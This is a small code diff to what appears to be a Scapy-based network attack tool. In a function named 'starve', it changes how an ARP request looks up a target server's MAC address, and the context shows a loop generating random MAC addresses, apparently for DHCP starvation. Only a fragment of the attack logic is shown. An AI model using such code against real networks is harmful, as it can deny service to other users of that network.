@@ -65,7 +65,7 @@ def starve(target_ip=0, i_face=conf.iface, persistent=False):
     :param i_face: the systems network interface for the attack
     :param persistent: a flag indicating if the attack is persistent or temporary
     """
-    server_mac = sr(ARP(op=ARP.who_has, pdst=str(target_ip)))[0][ARP].hwsrc
+    server_mac = sr(ARP(op=1, pdst=str(target_ip)))[0][ARP].hwsrc
     while True:
         counter = 0
         mac = RandMAC()
